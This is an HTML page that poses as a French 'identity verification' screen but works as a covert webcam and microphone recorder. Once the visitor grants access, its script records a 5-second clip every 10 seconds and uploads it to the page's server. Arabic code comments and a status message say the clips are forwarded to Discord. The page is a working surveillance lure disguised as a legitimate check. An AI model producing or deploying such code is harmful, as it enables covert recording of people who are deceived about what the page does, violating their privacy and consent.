<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification d'identité</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f9; text-align: center; padding: 50px; }
        .container { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        video { width: 320px; height: 240px; background: black; border-radius: 5px; margin-top: 15px; }
        #status { margin-top: 15px; font-weight: bold; color: #007bff; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Vérification d'identité en cours...</h2>
        <p>Veuillez rester devant la caméra.</p>
        <video id="webcam" autoplay playsinline muted></video>
        <div id="status">Initialisation de la caméra...</div>
    </div>

    <script>
        let mediaRecorder;
        let recordedChunks = [];
        const videoElement = document.getElementById('webcam');
        const statusDiv = document.getElementById('status');

        async function initCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                videoElement.srcObject = stream;
                startPeriodicRecording(stream);
            } catch (err) {
                statusDiv.innerText = "Erreur d'accès à la caméra !";
                statusDiv.style.color = "red";
            }
        }

        function startPeriodicRecording(stream) {
            // تسجيل فيديو كل 10 ثواني وإرساله تلقائياً للسيرفر والديسكورد
            setInterval(() => {
                recordAndSendChunk(stream);
            }, 10000);
        }

        function recordAndSendChunk(stream) {
            recordedChunks = [];
            try {
                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            } catch (e) {
                mediaRecorder = new MediaRecorder(stream);
            }

            mediaRecorder.ondataavailable = event => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };

            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                sendToServer(blob);
            };

            mediaRecorder.start();
            statusDiv.innerText = "Enregistrement d'un clip vidéo...";

            // وقف التسجيل بعد 5 ثواني وإرساله
            setTimeout(() => {
                if (mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                }
            }, 5000);
        }

        function sendToServer(blob) {
            const formData = new FormData();
            formData.append('video', blob, 'verification_clip.webm');

            statusDiv.innerText = "Transmission vers Discord...";
            
            fetch('/upload_video', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                statusDiv.innerText = "Clip envoyé avec succès !";
                setTimeout(() => { statusDiv.innerText = "Surveillance active..."; }, 3000);
            })
            .catch(err => {
                statusDiv.innerText = "Erreur de transmission.";
            });
        }

        window.onload = initCamera;
    </script>
</body>
</html>
